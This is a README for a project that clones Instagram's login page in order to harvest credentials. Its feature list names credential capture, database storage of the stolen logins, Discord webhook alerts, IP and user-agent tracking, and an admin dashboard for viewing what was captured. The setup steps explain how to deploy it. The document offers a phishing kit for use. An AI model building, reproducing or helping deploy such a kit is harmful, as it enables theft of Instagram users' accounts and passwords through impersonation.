# Instagram Login Page

A visually accurate recreation of Instagram's login page focusing on authenticity and design fidelity.

## Features

- Pixel-perfect recreation of Instagram's login UI
- Form-based credential capture
- PostgreSQL database integration for credential storage
- Discord webhook integration for real-time notifications
- IP address and user agent tracking
- Admin dashboard to view captured credentials

## Setup Instructions

### Prerequisites

- Node.js (v16 or later)
- PostgreSQL database

### Installation

1. Clone this repository:
```bash
git clone https://github.com/yourusername/instagram-login.git
cd instagram-login
```

2. Install dependencies:
```bash
npm install
```

3. Set up environment variables:
Create a `.env` file with the following variables:
```
DATABASE_URL=postgresql://username:password@localhost:5432/instagram_db
```

4. Set up the database:
```bash
npm run db:push
```

5. Update Discord webhook:
Edit the webhook URL in `server/routes.ts` to your Discord channel.

### Running the Application

```bash
npm run dev
```

The application will be available at http://localhost:5000/

## Admin Dashboard

Access the admin panel at http://localhost:5000/admin to view captured credentials.

## Project Structure

- `client/` - Frontend React application
- `server/` - Backend Express API
- `shared/` - Shared types and schemas
- `drizzle.config.ts` - Database configuration

## Technologies Used

- React.js
- TypeScript
- Express.js
- PostgreSQL with Drizzle ORM
- Tailwind CSS
- shadcn/ui components
